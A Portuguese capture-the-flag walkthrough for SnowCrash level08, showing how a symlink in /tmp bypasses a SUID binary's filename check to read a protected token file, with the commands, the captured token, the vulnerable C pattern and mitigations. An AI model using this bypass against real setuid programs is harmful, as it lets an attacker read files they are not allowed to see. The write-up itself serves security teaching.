# SnowCrash — Level08 Walkthrough (Metodologia)

## Objetivo

Neste nível, o objetivo é entender que bloquear um **nome** não é o mesmo que bloquear um **recurso**.

O binário verifica se o nome do arquivo passado como argumento contém a string `"token"` e rejeita se contiver. Mas o arquivo com o token existe no disco — e podemos acessá-lo com outro nome usando um **link simbólico**.

---

## Arquivos disponíveis

Listando o diretório home do level08:

```bash
ls -la
```

Saída típica:

```
-rwsr-s---+ 1 flag08 level08  level08
-rw-------  1 flag08 flag08   token
```

Existe um binário SUID pertencente ao `flag08` e um arquivo `token` legível apenas pelo `flag08`.

---

## Análise do binário

Inspecionando strings do binário:

```bash
strings level08
```

Trecho relevante:

```
You may not access '%s'
token
```

Testando o comportamento do binário:

```bash
./level08 token
```

Saída:

```
You may not access 'token'
```

O binário bloqueia qualquer argumento cujo nome contenha a string `"token"`.

---

## Entendimento da vulnerabilidade

O binário implementa uma verificação superficial de nome usando algo como:

```c
if (strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
open(argv[1], O_RDONLY);
```

O problema: a verificação é feita sobre o **nome do argumento**, não sobre o **inode/arquivo real** que será aberto.

Um **link simbólico** com um nome diferente aponta para o mesmo arquivo — o nome da checagem não vai conter `"token"`, mas o `open()` vai abrir o arquivo real.

---

## Exploração

### Criar um symlink com nome neutro

```bash
ln -s /home/user/level08/token /tmp/mylink
```

### Passar o symlink para o binário

```bash
./level08 /tmp/mylink
```

O binário verifica o nome `/tmp/mylink` — não contém `"token"` — passa na checagem. Depois chama `open("/tmp/mylink")` que o kernel resolve para o arquivo real `token`. O binário lê e imprime o conteúdo.

---

## Resultado

Saída obtida:

```
25749xKZ8L7DkSCwJkT9dyv6f
```

**Token obtido: 25749xKZ8L7DkSCwJkT9dyv6f**

```
<preencher após execução>
```

---

## Conceito aprendido

Este exercício demonstra: **Controle de acesso baseado em nome de arquivo é inseguro**.

Verificar o nome do argumento antes do `open()` não protege o arquivo real porque:

1. O caminho pode ser um symlink com nome diferente
2. O nome verificado e o recurso aberto são coisas distintas

---

## Vulnerabilidade real equivalente

Padrão vulnerável clássico (TOCTOU — Time Of Check to Time Of Use):

```c
// ERRADO: checa o nome, depois abre — não é a mesma "coisa"
if (strstr(path, "secret")) exit(1);
fd = open(path, O_RDONLY);
```

Esse padrão é perigoso em:

- Programas SUID que aceitam paths como argumento
- Scripts que validam nomes antes de processar arquivos
- Qualquer lógica que separa a validação do acesso real

---

## Mitigação

Para proteger corretamente:

- Resolver o caminho real com `realpath()` antes de qualquer comparação
- Verificar permissões do **inode** (via `stat()` / `fstat()`), não do nome
- Abrir o arquivo com `openat()` em diretórios controlados
- Evitar aceitar caminhos arbitrários em binários SUID

---

## Ferramentas utilizadas

| Comando       | Função                                       |
| ------------- | ---------------------------------------------- |
| `ls -la`    | listar arquivos e permissões                  |
| `strings`   | inspecionar strings do binário                |
| `ln -s`     | criar link simbólico com nome neutro          |
| `./level08` | executar binário com o symlink como argumento |
| `getflag`   | obter token do nível (se necessário)         |

---

## Resultado final

Bypass bem-sucedido: verificação de nome contornada via symlink.

**Token obtido: 25749xKZ8L7DkSCwJkT9dyv6f**

```
<preencher após execução>
```
